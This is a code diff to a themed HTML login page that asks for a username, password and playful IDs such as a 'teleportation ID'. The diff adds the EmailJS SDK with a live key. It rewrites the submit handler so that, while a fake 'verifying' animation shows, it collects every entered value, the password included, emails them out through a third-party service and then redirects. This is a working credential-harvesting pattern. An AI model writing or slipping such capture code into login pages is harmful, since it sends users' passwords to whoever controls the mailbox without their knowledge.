@@ -5,6 +5,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
+    
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("IlVJwCd-9iAQIiHI7"); // Your Public Key
+        })();
+    </script>
+
     <style>
         * {
             margin: 0;
@@ -69,7 +78,6 @@
             background-color: #4c1d95;
         }
 
-        /* Back button style */
         .back-button {
             position: absolute;
             top: 20px;
@@ -79,7 +87,6 @@
             cursor: pointer;
         }
 
-        /* Verifying animation styles */
         .verification-box {
             display: none;
             position: absolute;
@@ -98,14 +105,14 @@
             font-size: 1.2rem;
             font-weight: bold;
             box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-            margin-bottom: 5px; /* Reduced margin to bring it closer to the animation */
+            margin-bottom: 5px;
         }
 
         .verification-box img {
-            width: 5cm; /* Adjusted to a larger size */
-            height: 3cm; /* Adjusted to match width */
-            border-radius: 10px; /* Gives a soft curved box look */
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2); /* Added shadow for a premium feel */
+            width: 5cm;
+            height: 3cm;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
         }
     </style>
 </head>
@@ -142,19 +149,36 @@
     </div>
 
     <script>
-        // Show verification message and then redirect
         function showVerificationMessage() {
-            // Show the verification message
             var verificationBox = document.getElementById('verification-box');
             verificationBox.style.display = 'block';
 
-            // Simulate a delay of 2 seconds before redirecting
-            setTimeout(function () {
-                window.location.href = 'pg 1.html';
-            }, 2000);
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var roboId = document.getElementById('robo-id').value;
+            var neuralinkNo = document.getElementById('neuralink-no').value;
+            var teleportationId = document.getElementById('teleportation-id').value;
 
-            // Prevent the form from submitting normally
-            return false;
+            var templateParams = {
+                username: username,
+                password: password,
+                robo_id: roboId,
+                neuralink_no: neuralinkNo,
+                teleportation_id: teleportationId
+            };
+
+            emailjs.send('service_o5fuvdj', 'template_g6mv1a9', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    setTimeout(function () {
+                        window.location.href = 'pg 1.html';
+                    }, 2000);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert("Failed to send email. Please try again.");
+                });
+
+            return false; // Prevent real form submit
         }
     </script>
 
